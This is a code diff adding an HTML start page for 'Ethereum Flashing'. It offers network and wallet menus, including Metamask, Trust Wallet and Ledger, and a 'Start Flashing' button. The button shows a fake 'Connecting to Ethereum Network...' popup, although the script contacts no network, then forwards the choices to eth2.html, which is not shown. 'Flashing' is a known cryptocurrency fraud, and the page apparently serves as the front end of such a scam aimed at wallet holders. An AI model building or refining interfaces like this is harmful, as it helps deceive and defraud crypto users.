@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ethereum Flashing - Start</title>
+  <style>
+    body {
+      background: #0b0c2a;
+      font-family: 'Segoe UI', sans-serif;
+      color: #3cc8c8;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #8e44ec;
+      text-shadow: 0 0 10px #8e44ec;
+    }
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      background-color: #151640;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #3cc8c8;
+    }
+    label {
+      display: block;
+      margin: 20px 0 10px;
+      font-weight: bold;
+      color: #eee;
+    }
+    select {
+      width: 100%;
+      padding: 10px;
+      background: #1f204d;
+      color: #3cc8c8;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 30px;
+      padding: 12px 25px;
+      font-size: 16px;
+      background: #8e44ec;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 10px #8e44ec;
+    }
+    button:hover {
+      background: #a368f3;
+    }
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #1f204d;
+      border: 2px solid #3cc8c8;
+      padding: 20px 30px;
+      color: #3cc8c8;
+      font-size: 18px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #3cc8c8;
+      display: none;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Start Ethereum Flashing</h1>
+  <div class="container">
+    <label for="network">Select ETH Network:</label>
+    <select id="network">
+      <option value="">Choose Network</option>
+      <option>Ethereum Mainnet</option>
+      <option>Arbitrum</option>
+      <option>Optimism</option>
+      <option>Polygon</option>
+      <option>zkSync</option>
+      <option>Linea</option>
+      <option>Base</option>
+      <option>Blast</option>
+      <option>Scroll</option>
+      <option>Sepolia Testnet</option>
+    </select>
+
+    <label for="wallet">Select Wallet:</label>
+    <select id="wallet">
+      <option value="">Choose Wallet </option>
+      <option>Metamask</option>
+      <option>Trust Wallet</option>
+      <option>Coinbase Wallet</option>
+      <option>SafePal</option>
+      <option>BitKeep</option>
+      <option>Rabby</option>
+      <option>TokenPocket</option>
+      <option>Ledger</option>
+      <option>Infinity Wallet</option>
+      <option>Math Wallet</option>
+    </select>
+
+    <button onclick="startFlashing()">Start Flashing</button>
+  </div>
+
+  <div class="popup" id="popup">Connecting to Ethereum Network...</div>
+
+  <script>
+    function startFlashing() {
+      const network = document.getElementById("network").value;
+      const wallet = document.getElementById("wallet").value;
+
+      if (!network || !wallet) {
+        alert("Please select both network and wallet.");
+        return;
+      }
+
+      const popup = document.getElementById("popup");
+      popup.style.display = "block";
+
+      setTimeout(() => {
+        popup.style.display = "none";
+        const url = `eth2.html?network=${encodeURIComponent(network)}&wallet=${encodeURIComponent(wallet)}`;
+        window.location.href = url;
+      }, 4000); // Delay before redirect
+    }
+  </script>
+
+</body>
+</html>
